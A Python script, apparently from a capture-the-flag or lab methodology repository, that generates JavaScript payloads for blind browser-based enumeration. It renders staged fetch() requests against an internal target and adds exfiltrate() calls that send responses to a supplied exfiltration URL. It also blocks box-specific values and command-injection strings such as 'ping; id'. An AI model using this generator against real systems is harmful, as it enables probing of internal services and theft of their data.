#!/usr/bin/env python3
"""
Payload generator for blind-browser-enum.

"""

import argparse
import json
from pathlib import Path

import yaml

FORBIDDEN_SUBSTRINGS = [
    "somesecretnamelol",
    "svc://",
    "system/check",
    "ping; id",
    "localhost; id"
]

def refuse_if_sensitive(value: str):
    for bad in FORBIDDEN_SUBSTRINGS:
        if bad.lower() in value.lower():
            raise SystemExit(
                "[!] Refusing to generate payload with box-specific or exploit values."
            )

def render_stage(stage):
    js = []
    js.append(f"// Stage: {stage['name']}")
    js.append("resp = await fetch(`${TARGET}" + stage["path"] + "`, {")
    js.append(f'  method: "{stage["method"]}",')

    if "headers" in stage:
        js.append(f"  headers: {json.dumps(stage['headers'])},")

    if "body" in stage:
        js.append(
            "  body: " +
            (json.dumps(stage["body"]) if isinstance(stage["body"], dict)
             else json.dumps(stage["body"])) +
            ","
        )

    js.append("});")
    js.append("text = await resp.text();")

    if stage.get("exfil"):
        js.append(f'exfiltrate("{stage["name"]}", text);')

    return "\n".join(js)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--stages", required=True)
    parser.add_argument("--target", required=True)
    parser.add_argument("--exfil", required=True)
    parser.add_argument(
        "--acknowledge",
        required=True,
        help="Type a statement acknowledging this is a methodology demo"
    )
    args = parser.parse_args()

    refuse_if_sensitive(args.target)
    refuse_if_sensitive(args.exfil)

    stage_data = yaml.safe_load(Path(args.stages).read_text())

    rendered_stages = []
    for stage in stage_data["stages"]:
        rendered_stages.append(render_stage(stage))

    template = Path("payload.template.js").read_text()
    output = (
        template
        .replace("{{INTERNAL_TARGET}}", args.target)
        .replace("{{EXFIL_URL}}", args.exfil)
        .replace("{{STAGES}}", "\n\n".join(rendered_stages))
    )

    print(output)

if __name__ == "__main__":
    main()
